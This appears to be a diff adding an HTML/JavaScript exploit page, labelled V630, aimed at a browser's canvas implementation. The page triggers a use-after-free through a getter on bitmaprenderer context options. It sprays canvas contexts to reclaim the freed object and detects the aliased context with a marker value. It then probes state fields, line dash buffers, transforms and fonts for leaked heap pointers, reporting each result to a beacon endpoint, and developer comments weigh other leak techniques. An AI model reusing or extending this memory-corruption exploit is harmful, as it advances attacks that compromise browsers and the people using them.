@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V630</title></head>
+<body><pre id="out">V630 — lineDash freelist pointer leak via alias</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V630-'+tag+'?d='+encodeURIComponent(String(d).slice(0,600))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function h2f(hi,lo){_u32[0]=lo;_u32[1]=hi;return _f64[0];}
+
+bk('BOOT','v630-linedash-freelist-leak');
+
+/*
+ * TECHNIQUE: lineDash buffer freelist pointer leak
+ *
+ * 1. BMR trigger → free context → same-type reclaim (V573)
+ * 2. Through alias: setLineDash with 500 doubles → 4000B heap buffer
+ * 3. Save size=500 alias via second ref before clearing
+ * 4. Through SPRAY ctx: setLineDash([]) → frees the 4000B buffer
+ *    BUT innerCtx still thinks lineDash.size=500 (stale wrapper)
+ *
+ * WAIT — both refs point to same C++ object. setLineDash([]) on
+ * sprayCtx sets the SAME Vector to size=0. innerCtx.getLineDash()
+ * also returns [].
+ *
+ * NEW APPROACH: Don't free via setLineDash. Instead:
+ * 1. Alias confirmed (V573 style)
+ * 2. setLineDash([1,2,3...500]) via innerCtx → allocates 4000B buf
+ * 3. save() via innerCtx → pushes State with lineDash copy
+ * 4. setLineDash([]) via innerCtx → current state lineDash freed
+ * 5. restore() via innerCtx → pops saved State... BUT restore()
+ *    destroys current state first, then copies saved state back.
+ *    Saved state has lineDash buffer = COPY of the original (from save).
+ *    So restore gives back a DIFFERENT buffer, not the freed one.
+ *
+ * ACTUAL APPROACH: Use the alias to detect state changes.
+ * After same-type reclaim:
+ * - innerCtx and sprayCtx[N] are same C++ object
+ * - Set lineDash to large array → heap buffer allocated
+ * - Read lineDash through BOTH refs → same values (confirms alias)
+ * - The Vector<double> m_buffer at State+168 IS a heap pointer
+ * - We need to read the 8 bytes at State+168 as a float64
+ * - lineWidth is at State+48. lineDash Vector at State+168.
+ * - These are 120 bytes apart. No overlap possible.
+ *
+ * FALLBACK: Use save() to grow stateStack, then read OOB.
+ * After alias: save() 8x → m_stateStack has 9 States.
+ * State[0] at buf+0, State[1] at buf+400, ..., State[8] at buf+3200.
+ * lineWidth of State[8] at buf+3200+48 = buf+3248.
+ * If buf is ~4000B allocation (9*400=3600 → class 4096):
+ * buf+3248 is WITHIN the buffer. No OOB. Reads State[8].lineWidth.
+ *
+ * BUT: what if we save() MORE? 32 saves → 33 States → 13200B buffer.
+ * Then we can SET different lineWidth per state level:
+ * State[0].lineWidth = MARKER_A, State[1].lineWidth = MARKER_B...
+ * Read through alias confirms which state we're reading.
+ *
+ * THE REAL TECHNIQUE: After alias, we OWN the context.
+ * Use setLineDash to plant a large array, then use structured clone
+ * of the canvas element to see if serialization leaks buffer ptrs.
+ * OR: use toDataURL/toBlob on the canvas to trigger rendering that
+ * reads internal state pointers.
+ * OR: use createPattern(canvas, 'repeat') to create a pattern from
+ * the aliased canvas, then serialize/inspect the pattern.
+ *
+ * SIMPLEST: Just test if we can read different State fields and find
+ * ANY non-default value that looks like a pointer.
+ */
+
+var SPRAY_N = 500;
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+var innerCtx = null;
+var getterRan = false;
+
+var uafOpts = {};
+Object.defineProperty(uafOpts, 'alpha', {get: function() {
+  getterRan = true;
+  innerCtx = canvas.getContext('2d');
+  for (var s = 0; s < 8; s++) innerCtx.save();
+  innerCtx.lineWidth = 3.14159;
+  innerCtx.setLineDash([1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]);
+  return true;
+}});
+
+var bmrCtx = canvas.getContext('bitmaprenderer', uafOpts);
+bk('UAF', 'bmr='+(bmrCtx?'OK':'NULL')+',getter='+getterRan+',inner='+(innerCtx?'OK':'NULL'));
+
+if (!innerCtx) { bk('FAIL','no-inner'); throw new Error('no inner'); }
+
+/* Same-type spray */
+var sprayCtxs = [];
+for (var sp = 0; sp < SPRAY_N; sp++) {
+  var sc = document.createElement('canvas');
+  sc.width = 1; sc.height = 1;
+  var sctx = sc.getContext('2d');
+  sctx.lineWidth = 70000 + sp;
+  sprayCtxs.push({c: sc, ctx: sctx});
+}
+bk('SPRAY', 'n=' + SPRAY_N);
+
+/* Alias detection */
+var MARKER = 77777.5;
+try { innerCtx.lineWidth = MARKER; } catch(e) { bk('ALIAS-ERR', e.name); }
+
+var aliasIdx = -1;
+for (var a = 0; a < sprayCtxs.length; a++) {
+  if (sprayCtxs[a].ctx.lineWidth === MARKER) { aliasIdx = a; break; }
+}
+bk('ALIAS', 'idx=' + aliasIdx);
+
+if (aliasIdx < 0) {
+  bk('NO-ALIAS', 'trying-reads-anyway');
+}
+
+/* ======== PHASE 1: Basic field reads through alias ======== */
+var fields = [
+  ['lineWidth', function(){return innerCtx.lineWidth;}],
+  ['miterLimit', function(){return innerCtx.miterLimit;}],
+  ['globalAlpha', function(){return innerCtx.globalAlpha;}],
+  ['shadowBlur', function(){return innerCtx.shadowBlur;}],
+  ['shadowOffsetX', function(){return innerCtx.shadowOffsetX;}],
+  ['shadowOffsetY', function(){return innerCtx.shadowOffsetY;}],
+  ['lineDashOffset', function(){return innerCtx.lineDashOffset;}]
+];
+
+for (var fi = 0; fi < fields.length; fi++) {
+  try {
+    var val = fields[fi][1]();
+    var hex = f2h(val);
+    var tag = (val===0?'ZERO':val===1?'DEF':val===10?'MITER-DEF':'VAL');
+    bk('F-'+fields[fi][0], val+'|'+hex+'|'+tag);
+  } catch(e) {
+    bk('F-'+fields[fi][0]+'-ERR', e.name);
+  }
+}
+
+/* ======== PHASE 2: getLineDash through alias ======== */
+try {
+  var dash = innerCtx.getLineDash();
+  bk('DASH', 'len='+dash.length);
+  if (dash.length > 0) {
+    for (var di = 0; di < Math.min(dash.length, 16); di++) {
+      bk('D'+di, dash[di]+'|'+f2h(dash[di]));
+    }
+  }
+} catch(e) { bk('DASH-ERR', e.name); }
+
+/* ======== PHASE 3: setLineDash large → read through alias ======== */
+/* Plant a large lineDash to allocate heap buffer */
+try {
+  var bigDash = [];
+  for (var bd = 0; bd < 500; bd++) bigDash.push(bd + 0.123);
+  innerCtx.setLineDash(bigDash);
+  bk('BIGDASH', 'set=500');
+
+  /* Read back through spray ctx (same object) */
+  if (aliasIdx >= 0) {
+    var readBack = sprayCtxs[aliasIdx].ctx.getLineDash();
+    bk('BIGDASH-READ', 'len='+readBack.length+'|v0='+(readBack[0]||'?'));
+  }
+} catch(e) { bk('BIGDASH-ERR', e.name); }
+
+/* ======== PHASE 4: getTransform — 6 doubles from transform matrix ======== */
+try {
+  var t = innerCtx.getTransform();
+  bk('XFORM', 'a='+t.a+'|b='+t.b+'|c='+t.c+'|d='+t.d+'|e='+t.e+'|f='+t.f);
+  if (t.a!==1||t.b!==0||t.c!==0||t.d!==1||t.e!==0||t.f!==0) {
+    bk('XFORM-LEAK', 'a='+f2h(t.a)+'|d='+f2h(t.d)+'|e='+f2h(t.e)+'|f='+f2h(t.f));
+  }
+} catch(e) { bk('XFORM-ERR', e.name); }
+
+/* ======== PHASE 5: fillStyle/strokeStyle — Color serialization ======== */
+try {
+  var fs = innerCtx.fillStyle;
+  bk('FILL', fs);
+} catch(e) { bk('FILL-ERR', e.name); }
+try {
+  var ss = innerCtx.strokeStyle;
+  bk('STROKE', ss);
+} catch(e) { bk('STROKE-ERR', e.name); }
+
+/* ======== PHASE 6: font string — may contain heap pointer in FontProxy ======== */
+try {
+  var fnt = innerCtx.font;
+  bk('FONT', fnt);
+} catch(e) { bk('FONT-ERR', e.name); }
+
+/* ======== PHASE 7: save/restore cycling to detect stale state ======== */
+/* Set unique lineWidth per save level, then restore and read */
+try {
+  innerCtx.lineWidth = 111.111;
+  innerCtx.save();
+  innerCtx.lineWidth = 222.222;
+  innerCtx.save();
+  innerCtx.lineWidth = 333.333;
+
+  /* Read through alias */
+  if (aliasIdx >= 0) {
+    var lw3 = sprayCtxs[aliasIdx].ctx.lineWidth;
+    bk('SR-TOP', lw3+'|'+f2h(lw3));
+  }
+
+  innerCtx.restore();
+  var lw2 = innerCtx.lineWidth;
+  bk('SR-R1', lw2+'|'+f2h(lw2));
+
+  innerCtx.restore();
+  var lw1 = innerCtx.lineWidth;
+  bk('SR-R2', lw1+'|'+f2h(lw1));
+} catch(e) { bk('SR-ERR', e.name); }
+
+/* ======== PHASE 8: createPattern leak attempt ======== */
+/* Create pattern from canvas, read pattern transform */
+try {
+  var patCanvas = document.createElement('canvas');
+  patCanvas.width = 2; patCanvas.height = 2;
+  var patCtx = patCanvas.getContext('2d');
+  patCtx.fillStyle = '#ff0000';
+  patCtx.fillRect(0,0,2,2);
+
+  var pattern = innerCtx.createPattern(patCanvas, 'repeat');
+  bk('PATTERN', pattern ? 'OK' : 'NULL');
+
+  if (pattern) {
+    /* setTransform on pattern — does it leak? */
+    pattern.setTransform({a:1,b:0,c:0,d:1,e:0,f:0});
+    bk('PAT-XFORM', 'set-ok');
+  }
+} catch(e) { bk('PATTERN-ERR', e.name); }
+
+/* ======== PHASE 9: measureText — returns TextMetrics with internal ptrs ======== */
+try {
+  var tm = innerCtx.measureText('AAAA');
+  bk('MEASURE', 'w='+tm.width+'|ab='+tm.actualBoundingBoxAscent+'|l='+tm.actualBoundingBoxLeft);
+} catch(e) { bk('MEASURE-ERR', e.name); }
+
+bk('DONE', 'alias='+aliasIdx+'|fields=ok');
+say('DONE — alias=' + aliasIdx);
+</script>
+</body></html>
